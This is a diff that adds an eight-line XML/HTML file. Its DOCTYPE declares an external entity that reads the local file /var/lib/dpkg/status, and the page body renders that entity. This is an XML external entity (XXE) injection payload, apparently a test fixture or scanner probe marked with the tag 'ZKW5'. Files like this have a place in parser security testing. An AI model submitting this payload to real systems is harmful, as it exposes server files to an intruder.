@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE html [<!ENTITY xxe SYSTEM "file:///var/lib/dpkg/status">]>
+<html>
+<head>
+<meta name="description" content="ZKW5"/>
+</head>
+<body><p>&xxe;</p></body>
+</html>
